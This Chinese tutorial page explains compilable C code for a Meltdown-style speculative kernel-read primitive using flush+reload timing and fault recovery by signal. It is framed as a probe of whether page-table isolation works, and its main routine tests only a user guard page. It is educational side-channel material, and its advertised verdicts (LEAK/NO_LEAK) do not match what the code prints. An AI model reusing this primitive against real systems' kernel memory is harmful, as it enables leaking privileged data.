---
title: Meltdown 源码讲解
description: 一份可编译的乱序读取原语：故障为什么在退休时才报告、信号怎么把 fault 变成重试、步长为什么用 4096、页表隔离下为什么期望 NO_LEAK。
date: '2026-11-26'
tags: [微架构安全, Meltdown, 页表隔离, 侧信道, 源码]
book: microarch-00-intro
---

[上一节](./microarch-04e-meltdown.md)讲了页表隔离前后可疑地址的可观测性差异，这一节给出能编译的原语，并把“失败”做成一种正式输出。

[[toc]]

## 判据：三态而不是两态

页表隔离生效时，这份程序必然拿不到内核数据。那是**缓解生效的证据**，不是程序坏了，更不是“没有漏洞”。所以输出必须是三种：读到字节（LEAK）、只有故障没有数据（NO_LEAK）、连自映射的守护页都拿不到信号（FAULT_PATH_BROKEN）。两态输出会把这三种情况压成一个“失败”，读的人就分不清是机制不成立、还是缓解起作用、还是自己程序写错了。

## 结构：信号兜底

```c
/* meltdown_probe.c — Meltdown 类乱序读取原语的最小骨架
 * 平台: x86-64 用户态, gcc -O0
 * 编译: make meltdown_probe
 *
 * 说明（照实写）：
 *   - 该原语依赖"故障被延迟到指令退休时才报告"，投机 load 的结果在此之前
 *     已经把 array2 的某一行带进 cache。
 *   - KPTI 开启的内核里，内核页根本不在用户页表中，地址直接 fault，
 *     投机窗口拿不到数据 —— 期望结果是泄露失败，那正好是"缓解生效"的证据。
 *   - 所以这个程序真正可判定的输出是三态：LEAK / NO_LEAK / FAULT_ONLY。
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#ifdef _WIN32
#include <intrin.h>
#else
#include <x86intrin.h>
#endif

#define ARRAY2_SIZE (256 * 4096)
#define RETRIES     1000
#define HIT         80

static uint8_t  array2[ARRAY2_SIZE];
static uint8_t  temp = 0;
static sigjmp_buf jbuf;
```

`*addr` 对不可读页必然触发页错误，但异常要等指令**退休**才报告。退休之前，紧随其后的 `array2[v * 4096]` 已经把某个候选行带进缓存——这就是“没有读到数据，却留下了痕迹”。

sigsetjmp 与 siglongjmp 把信号转成“这次尝试失败”，而不是让进程直接死掉。没有这一层，第一次 fault 就结束了，谈不上反复重试；而重试次数正是信噪比的来源。

## 重试与打分

```c
static void fault_handler(int sig) { (void)sig; siglongjmp(jbuf, 1); }

static inline uint64_t rdtscp_ordered(void)
{
    unsigned aux;
    _mm_lfence();
    uint64_t t = __rdtscp(&aux);
    _mm_lfence();
    return t;
}

static inline uint64_t time_load(volatile uint8_t *p)
{
    uint64_t t = rdtscp_ordered();
    (void)*p;
    return rdtscp_ordered() - t;
}

/* 返回 1 = 读到了字节(LEAK)，0 = 只有 fault 没有数据(FAULT_ONLY) */
static int meltdown_leak(uint8_t *addr, uint8_t *out)
{
    for (int r = 0; r < RETRIES; r++) {
        for (int c = 0; c < 256; c++)
            _mm_clflush(&array2[c * 4096]);

        volatile uint8_t v = 0;
        int faulted = 0;

        if (sigsetjmp(jbuf, 1) == 0) {
            _mm_mfence();
            v = *addr;                 /* 特权页：退休时必然 #PF */
            _mm_lfence();
            temp &= array2[v * 4096];  /* 投机窗口内顺手把它变成 cache 行 */
        } else {
            faulted = 1;
        }
        if (!faulted) {                /* 页本来就可读，不要浪费一次机会 */
            *out = v;
            return 1;
        }

        for (int c = 0; c < 256; c++) {
            if (time_load(&array2[c * 4096]) < HIT) {
                *out = (uint8_t)c;
                return 1;
            }
        }
    }
    return 0;
}
```

缓冲步长用 4096 而不是 512：每个候选值独占一整页，4 KB 的间隔让相邻候选既不共享 cache line，也不共享页表项。用 512 会让两个候选落在同一行的边界上，reload 时互相冒充。

页本来可读时直接返回，不浪费一次 reload 扫描——那是“读到值”而不是“靠时序推断”，两者的可信度不同，代码里要分开。

## 守护页自检

```c
int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("Meltdown 类原语 — 缓解状态探针\n");

    for (int i = 0; i < ARRAY2_SIZE; i++) array2[i] = 1;

    struct sigaction sa;
    memset(&sa, 0, sizeof sa);
    sa.sa_handler = fault_handler;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS,  &sa, NULL);

    /* 用户态自映射的哨兵页：用 mmap 置 PROT_NONE 得到"必然 fault 的地址"，
     * 这样不需要任何特权地址也能验证 fault 路径本身工作正常。 */
    void *guard = NULL;
#if !defined(_WIN32)
    {
        extern void *mmap(void *, size_t, int, int, int, long);
        extern int mprotect(void *, size_t, int);
        guard = mmap(NULL, 4096, 3 /*RW*/, 0x22 /*PRIVATE|ANON*/, -1, 0);
        if (guard != (void *)-1 && guard) mprotect(guard, 4096, 0 /*NONE*/);
    }
#endif

    if (!guard || guard == (void *)-1) {
        printf("[skip] 无 mmap/mprotect，跳过 fault 路径自检\n");
        printf("VERDICT=NO_PROBE\n");
        return 0;
    }

    uint8_t val = 0;
    int got = meltdown_leak((uint8_t *)guard, &val);
    printf("[fault ] guard page 读取: %s value=0x%02x\n",
           got ? "有信号进入 reload 路径" : "未取得可判定信号", val);
    printf("注意: 若把 addr 换成内核地址而输出 VERDICT=NO_LEAK，即 KPTI 生效。\n");
    printf("VERDICT=%s\n", got ? "FAULT_PATH_OK" : "FAULT_PATH_BROKEN");
    return 0;
}
```

这是最容易被忽略的一段：用 mmap 加 PROT_NONE 造一个必然 fault 的地址，先验证“信号 → 长跳转 → 继续跑”这条路径本身是通的。连它都拿不到信号，说明问题在程序而不在 CPU，此时输出 FAULT_PATH_BROKEN，别读成“没有漏洞”。

换一个真正的内核地址去跑，期望结果是 NO_LEAK：KPTI 把内核映射从用户页表里摘掉，投机也取不到数据，reload 全 miss。这个“失败”才是可引用的结论——它说明隔离在这一次测量里确实生效。

## 构建

```makefile
CC      ?= gcc
CFLAGS  ?= -O0 -std=c99 -fno-stack-protector -fno-pie -no-pie
LDFLAGS ?=
BINS     = spectre meltdown_probe

all: $(BINS)

spectre: spectre.c
	$(CC) $(CFLAGS) -o $@ $< $(LDFLAGS)

meltdown_probe: meltdown_probe.c
	$(CC) $(CFLAGS) -o $@ $< $(LDFLAGS)

run: spectre
	./spectre

clean:
	rm -f $(BINS) *.o *.exe

.PHONY: all run clean
```

与 Spectre 那份共用一份 makefile：`-O0` 保住投机窗口，`-fno-pie -no-pie` 固定加载地址。

```bash
make meltdown_probe && ./meltdown_probe
```

输出里先看 guard page 那一行。它不通，后面的判定都不用看。

## 判定边界

程序只回答“这一次测量里，可疑地址的访问有没有在缓存里留下可观测痕迹”。它不回答“这台机器是否有漏洞”——那要看页表状态、微码版本和判定线怎么冻结，见[变体与判定](./microarch-04c-variants.md)。把测量当结论，是这类程序最常见的误读。
